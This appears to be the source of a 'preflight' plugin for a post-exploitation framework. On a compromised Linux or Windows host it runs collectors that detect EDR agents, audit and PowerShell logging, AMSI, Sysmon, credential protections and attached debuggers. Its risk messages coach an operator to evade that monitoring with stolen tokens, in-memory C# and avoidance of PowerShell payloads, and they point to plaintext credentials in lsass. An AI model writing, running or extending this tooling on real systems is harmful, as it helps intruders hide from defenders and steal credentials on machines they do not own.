from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..linux._helpers import build_linux_collector_command
from .common import format_generic_report
from .runner import run_collector_plugin


_EDR_PROCESS_NAMES = (
    # CrowdStrike
    'csfalconservice', 'csfalconcontainer', 'csagent',
    # Carbon Black
    'cbdefense', 'cbagentd', 'carbonblack', 'repmgr',
    # SentinelOne
    'sentinelagent', 'sentinelone', 'sentinelservicehost',
    # Cortex XDR / Palo Alto
    'cortex', 'traps', 'cyvera',
    # Microsoft Defender / Defender ATP
    'msmpeng', 'mssense', 'nissrv', 'securityhealthservice', 'windefend',
    # Cylance
    'cylance', 'cyoptics', 'cyupdate',
    # FireEye
    'xagt', 'fireeye',
    # Tanium
    'taniumclient', 'tanium',
    # Qualys
    'qualysagent', 'qualys-cloud-agent',
    # Rapid7
    'ir_agent',
    # Cybereason
    'cybereason', 'csensoredr',
    # Symantec / Broadcom
    'rtvscan', 'sepmaster',
    # McAfee / Trellix
    'mfehidk', 'trellix',
    # Sophos
    'savservice', 'hmpalert',
    # Elastic
    'elastic-agent', 'filebeat', 'winlogbeat',
    # Splunk
    'splunkd', 'splunkforwarder',
    # Sysmon
    'sysmon', 'sysmon64',
    # Wazuh
    'wazuh',
    # osquery
    'osqueryd', 'osquery',
    # Velociraptor
    'velociraptor',
    # Elastic Endgame
    'endgame',
    # BitDefender
    'bdservice', 'bdagent',
    # ESET
    'ekrn', 'egui',
    # Linux-specific eBPF monitoring agents
    'sysdig', 'falco', 'tracee', 'tetragon', 'aquasec', 'cilium-agent',
)


# ---------------------------------------------------------------------------
# Linux collector
# ---------------------------------------------------------------------------
def _linux_collector_source():
    names_repr = '[' + ', '.join(repr(n) for n in _EDR_PROCESS_NAMES) + ']'
    return r'''
import glob
import os
import re
import subprocess
import time

_EDR_NAMES = ''' + names_repr + r'''

_START = time.time()
_BUDGET = 25.0  # hard ceiling for the whole collector


def sh(cmd, timeout=2):
    """Run a shell command with a hard timeout; empty string on any failure."""
    remaining = _BUDGET - (time.time() - _START)
    if remaining <= 0:
        return ''
    t = min(timeout, remaining)
    try:
        out = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.DEVNULL, timeout=t,
        )
        return out.decode('utf-8', 'ignore') if isinstance(out, bytes) else out
    except Exception:
        return ''


def read_file(path, limit=8192):
    try:
        with open(path, 'r', errors='ignore') as fh:
            return fh.read(limit)
    except Exception:
        return ''


result = {
    'summary': {},
    'edr_products': [],
    'auditd': {},
    'ebpf': {},
    'lsm': {},
    'ssh': {},
    'shell': {},
    'kernel': {},
    'risk_assessment': [],
}


# --- Process list: first command that returns non-empty wins ---
ps_out = ''
for cmd in ('ps -eo pid,comm,args 2>/dev/null',
            'ps auxww 2>/dev/null',
            'ps -ef 2>/dev/null'):
    ps_out = sh(cmd, timeout=3)
    if ps_out.strip():
        lines = ps_out.splitlines()
        if lines and ('PID' in lines[0] or 'USER' in lines[0]):
            ps_out = '\n'.join(lines[1:])
        break


# --- EDR / agent process scan ---
seen_matches = set()
for line in ps_out.splitlines():
    low = line.strip().lower()
    if not low:
        continue
    for name in _EDR_NAMES:
        if name in low and name not in seen_matches:
            seen_matches.add(name)
            parts = line.split(None, 2)
            result['edr_products'].append({
                'match': name,
                'pid': parts[0] if parts else '?',
                'exe': (parts[1] if len(parts) > 1 else '?')[:80],
            })
            break


# --- auditd ---
audit_running = 'auditd' in ps_out.lower()
audit_rules_raw = sh('auditctl -l 2>/dev/null', timeout=2)
audit_rule_lines = [l for l in audit_rules_raw.splitlines()
                    if l.strip() and not l.startswith('No rules')]
audit_conf_files = []
if os.path.isdir('/etc/audit/rules.d'):
    try:
        audit_conf_files = sorted(os.listdir('/etc/audit/rules.d'))[:20]
    except Exception:
        pass
result['auditd'] = {
    'daemon_running': audit_running,
    'rule_count': len(audit_rule_lines),
    'rules_sample': audit_rule_lines[:12],
    'conf_files': audit_conf_files,
}


# --- eBPF (filesystem-only, no bpftool spawning) ---
bpf_pins = 0
try:
    if os.path.isdir('/sys/fs/bpf'):
        bpf_pins = len(os.listdir('/sys/fs/bpf'))
except Exception:
    pass
result['ebpf'] = {'sys_bpf_pins': bpf_pins}


# --- LSM state ---
selinux = read_file('/sys/fs/selinux/enforce', 8).strip()
selinux = 'Enforcing' if selinux == '1' else ('Permissive' if selinux == '0' else 'not present')
lsm_active = read_file('/sys/kernel/security/lsm', 200).strip()
result['lsm'] = {
    'selinux': selinux,
    'lsm_active': lsm_active or '(unavailable)',
}


# --- SSH session recording ---
sshd_text = read_file('/etc/ssh/sshd_config')
dropins = glob.glob('/etc/ssh/sshd_config.d/*.conf')
for dropin in dropins[:10]:
    sshd_text += read_file(dropin)
force_command = bool(re.search(r'^\s*ForceCommand', sshd_text, re.M))
recording = bool(re.search(r'^\s*ForceCommand\s+.*(tlog|script|sudoreplay|audit)', sshd_text, re.M))
result['ssh'] = {
    'force_command_present': force_command,
    'recording_suspected': recording,
    'dropin_files': len(dropins),
}


# --- Shell audit settings ---
result['shell'] = {
    'shell': os.environ.get('SHELL', '(unset)'),
    'histfile': os.environ.get('HISTFILE', '(unset)'),
    'histcontrol': os.environ.get('HISTCONTROL', '(unset)'),
    'prompt_command': os.environ.get('PROMPT_COMMAND', '(unset)')[:200],
}


# --- Kernel cmdline ---
cmdline = read_file('/proc/cmdline', 400).strip()
result['kernel'] = {
    'cmdline': cmdline[:300],
    'audit_enabled': 'audit=1' in cmdline,
}


# --- Risk assessment ---
risks = []
if result['edr_products']:
    names = sorted(set(e['match'] for e in result['edr_products']))
    risks.append(f"[CRIT] EDR/agent process(es) present: {', '.join(names[:8])}")
if audit_running and result['auditd']['rule_count'] > 0:
    risks.append(f"[CRIT] auditd running with {result['auditd']['rule_count']} rule(s)")
elif audit_running:
    risks.append("[WARN] auditd running with no loaded rules")
if bpf_pins > 0:
    risks.append(f"[CRIT] {bpf_pins} pinned eBPF object(s) in /sys/fs/bpf")
pc = result['shell']['prompt_command']
if pc and pc != '(unset)' and len(pc) > 10:
    risks.append("[WARN] PROMPT_COMMAND is set — commands may be logged via shell hook")
if recording:
    risks.append("[CRIT] SSH ForceCommand suggests session recording")
if selinux == 'Enforcing':
    risks.append("[WARN] SELinux enforcing — operations may be denied by policy")
if not risks:
    risks.append("[INFO] No obvious detection controls observed")

result['risk_assessment'] = risks


result['summary'] = {
    'edr_products_detected': len(set(e['match'] for e in result['edr_products'])),
    'auditd_running': audit_running,
    'auditd_rules': result['auditd']['rule_count'],
    'ebpf_pins': bpf_pins,
    'selinux': selinux,
    'ssh_force_command': force_command,
    'risk_count': len(risks),
}

_emit(result)
'''

def _build_linux_command():
    return build_linux_collector_command(_linux_collector_source())


# ---------------------------------------------------------------------------
# Windows collector
# ---------------------------------------------------------------------------

def _build_windows_command():
    names_ps = ', '.join(f"'{n}'" for n in _EDR_PROCESS_NAMES)
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$s='{PLUGIN_MARK_START}'; $e='{PLUGIN_MARK_END}'

$edrNames = @( {names_ps} )

# --- EDR process detection ---
# Uses .Contains() instead of -like so bracket characters in a process
# name cannot be interpreted as wildcards.
$edr = @()
$seenPids = @{{}}
foreach ($p in (Get-Process -EA 0)) {{
    if (-not $p.ProcessName) {{ continue }}
    $n = $p.ProcessName.ToLower()
    foreach ($known in $edrNames) {{
        if ($n.Contains($known)) {{
            if (-not $seenPids.ContainsKey($p.Id)) {{
                $seenPids[$p.Id] = $true
                $edr += [ordered]@{{
                    match = $known
                    pid = $p.Id
                    name = $p.ProcessName
                }}
            }}
            break
        }}
    }}
}}

# --- AV products via SecurityCenter2 ---
$avProducts = @()
try {{
    foreach ($a in (Get-CimInstance -Namespace 'root/SecurityCenter2' -ClassName AntiVirusProduct -EA 0)) {{
        $avProducts += [ordered]@{{
            name = $a.displayName
            state = $a.productState
        }}
    }}
}} catch {{}}

# --- PowerShell logging registry ---
$logging = [ordered]@{{
    ScriptBlockLogging = $false
    ModuleLogging = $false
    Transcription = $false
}}
try {{
    $v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -EA 0).EnableScriptBlockLogging
    if ($v -eq 1) {{ $logging.ScriptBlockLogging = $true }}
}} catch {{}}
try {{
    $v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' -Name 'EnableModuleLogging' -EA 0).EnableModuleLogging
    if ($v -eq 1) {{ $logging.ModuleLogging = $true }}
}} catch {{}}
try {{
    $v = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -Name 'EnableTranscripting' -EA 0).EnableTranscripting
    if ($v -eq 1) {{ $logging.Transcription = $true }}
}} catch {{}}

$execPolicy = 'Unknown'
try {{ $execPolicy = "$(Get-ExecutionPolicy -Scope LocalMachine -EA 0)" }} catch {{}}

# --- PowerShell version and language mode ---
$psVersion = 'unknown'
$psLanguageMode = 'unknown'
try {{ $psVersion = "$($PSVersionTable.PSVersion)" }} catch {{}}
try {{ $psLanguageMode = "$($ExecutionContext.SessionState.LanguageMode)" }} catch {{}}

# --- AMSI loaded in current process ---
$amsiLoaded = $false
try {{
    foreach ($m in (Get-Process -Id $PID -Module -EA 0)) {{
        if ($m.ModuleName -ieq 'amsi.dll') {{ $amsiLoaded = $true; break }}
    }}
}} catch {{}}

# --- AMSI providers registered ---
$amsiProviders = 0
try {{
    $p = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers' -EA 0
    if ($p) {{ $amsiProviders = @($p).Count }}
}} catch {{}}

# --- Sysmon ---
$sysmonRunning = $false
try {{
    foreach ($svc in (Get-Service -Name 'Sysmon64','Sysmon' -EA 0)) {{
        if ($svc.Status -eq 'Running') {{ $sysmonRunning = $true; break }}
    }}
}} catch {{}}

# --- LSA protection / Credential Guard ---
$lsaProtection = 0
try {{
    $v = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'RunAsPPL' -EA 0).RunAsPPL
    if ($v) {{ $lsaProtection = [int]$v }}
}} catch {{}}
$credGuard = 0
try {{
    $v = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'LsaCfgFlags' -EA 0).LsaCfgFlags
    if ($v) {{ $credGuard = [int]$v }}
}} catch {{}}

# --- WDigest plaintext caching (high value if enabled) ---
$wdigest = -1
try {{
    $v = (Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -EA 0).UseLogonCredential
    if ($null -ne $v) {{ $wdigest = [int]$v }} else {{ $wdigest = 0 }}
}} catch {{}}

# --- Audit policy: parse into a compact form ---
$auditSample = @()
try {{
    $raw = @(auditpol /get /category:* 2>&1)
    foreach ($line in $raw) {{
        $l = "$line"
        # Keep only lines that show a success/failure policy
        if ($l -match '(Success|Failure|No Auditing)') {{
            $auditSample += $l.Trim()
            if ($auditSample.Count -ge 25) {{ break }}
        }}
    }}
}} catch {{}}

# --- Debugger heuristic: parent process looks like a debugger ---
$debuggerSuspected = $false
try {{
    $self = Get-CimInstance Win32_Process -Filter "ProcessId = $PID" -EA 0
    if ($self -and $self.ParentProcessId) {{
        $parent = Get-CimInstance Win32_Process -Filter "ProcessId = $($self.ParentProcessId)" -EA 0
        if ($parent -and $parent.Name -match 'windbg|ollydbg|x64dbg|x32dbg|ida') {{
            $debuggerSuspected = $true
        }}
    }}
}} catch {{}}

# --- Defender realtime status ---
$defenderRealtime = 'unknown'
try {{
    $mps = Get-MpComputerStatus -EA 0
    if ($mps) {{
        if ($mps.RealTimeProtectionEnabled) {{ $defenderRealtime = 'enabled' }}
        else {{ $defenderRealtime = 'disabled' }}
    }}
}} catch {{}}

# --- Risk assessment: actionable guidance ---
$risks = @()
if ($edr.Count -gt 0) {{
    $names = ($edr | Select-Object -ExpandProperty name -Unique) -join ', '
    $risks += "[CRIT] EDR/agent process(es) detected: $names — assume process-creation telemetry. Prefer --spawn-shell from a stolen token over PS-based flows."
}}
if ($logging.ScriptBlockLogging) {{
    $risks += "[CRIT] PowerShell ScriptBlock logging ENABLED — every script you send is logged in cleartext. Avoid PS payloads; prefer compiled C# via inmemory."
}}
if ($logging.ModuleLogging) {{
    $risks += "[WARN] PowerShell Module logging ENABLED — pipeline execution is recorded."
}}
if ($logging.Transcription) {{
    $risks += "[CRIT] PowerShell Transcription ENABLED — full session written to disk. Assume every command is preserved."
}}
if ($amsiLoaded) {{
    $risks += "[WARN] AMSI loaded in current process — script content is scanned before execution. Public bypass patterns are signatured."
}}
if ($amsiProviders -gt 0) {{
    $risks += "[INFO] $amsiProviders AMSI provider(s) registered — third-party AV is scanning scripts."
}}
if ($sysmonRunning) {{
    $risks += "[CRIT] Sysmon is running — process, file, network, and registry telemetry expected. Match Sysmon config before acting."
}}
if ($lsaProtection -ge 1) {{
    $risks += "[WARN] LSA Protection (RunAsPPL=$lsaProtection) enabled — lsass token access denied by design. Use steal_token against non-PPL processes only."
}}
if ($credGuard -ge 1) {{
    $risks += "[WARN] Credential Guard enabled (LsaCfgFlags=$credGuard) — cached credentials not accessible via standard paths."
}}
if ($wdigest -eq 1) {{
    $risks += "[CRIT] WDigest plaintext caching ENABLED (UseLogonCredential=1) — plaintext credentials may be in lsass memory."
}}
if ($defenderRealtime -eq 'enabled') {{
    $risks += "[WARN] Defender real-time protection enabled — on-access scanning active."
}}
if ($psLanguageMode -and $psLanguageMode -ne 'FullLanguage') {{
    $risks += "[CRIT] PowerShell Language Mode is $psLanguageMode — reflective loading, Add-Type, and many .NET calls are blocked. Prefer non-PS vectors."
}}
if ($debuggerSuspected) {{
    $risks += "[CRIT] Parent process looks like a debugger — an analyst may be attached."
}}
if ($risks.Count -eq 0) {{
    $risks += "[INFO] No obvious detection controls observed. Still assume baseline Windows logging (Security, System, PowerShell Operational)."
}}

$result = [ordered]@{{
    summary = [ordered]@{{
        edr_processes = $edr.Count
        av_products = $avProducts.Count
        scriptblock_logging = $logging.ScriptBlockLogging
        module_logging = $logging.ModuleLogging
        transcription = $logging.Transcription
        execution_policy = "$execPolicy"
        ps_version = "$psVersion"
        ps_language_mode = "$psLanguageMode"
        amsi_loaded = $amsiLoaded
        amsi_providers = $amsiProviders
        sysmon_running = $sysmonRunning
        lsass_protection = $lsaProtection
        credential_guard = $credGuard
        wdigest_plaintext = $wdigest
        defender_realtime = $defenderRealtime
        debugger_suspected = $debuggerSuspected
        risk_count = $risks.Count
    }}
    edr_processes = $edr
    av_products = $avProducts
    powershell = [ordered]@{{
        logging = $logging
        version = "$psVersion"
        language_mode = "$psLanguageMode"
        execution_policy = "$execPolicy"
    }}
    audit_policy_sample = $auditSample
    risk_assessment = $risks
}}

Write-Output ($s + (ConvertTo-Json $result -Depth 5 -Compress) + $e)
"""


# ---------------------------------------------------------------------------
# Custom formatter — risk assessment first
# ---------------------------------------------------------------------------

def _format_preflight(data: dict) -> str:
    sections = []

    risks = data.get('risk_assessment') or []
    if risks:
        lines = ['== RISK ASSESSMENT ==']
        for r in risks:
            lines.append(f'  {r}')
        sections.append('\n'.join(lines))

    # Remove risk_assessment so it is not duplicated by the generic renderer
    data_no_risks = {k: v for k, v in data.items() if k != 'risk_assessment'}
    detail = format_generic_report(data_no_risks, title='Raw Data')
    if detail:
        sections.append(detail)

    return '\n\n'.join(sections)


# ---------------------------------------------------------------------------
# Plugin entry point
# ---------------------------------------------------------------------------

@plugin.command(
    name='preflight',
    platforms=['linux', 'windows', 'unix'],
    description='Detection environment assessment: EDR/AV, PowerShell logging, AMSI, Sysmon, audit controls',
)
def run(session: SessionContext, args):
    return run_collector_plugin(
        session,
        'preflight',
        _build_linux_command,
        _build_windows_command,
        _format_preflight,
        timeout=60.0,
    )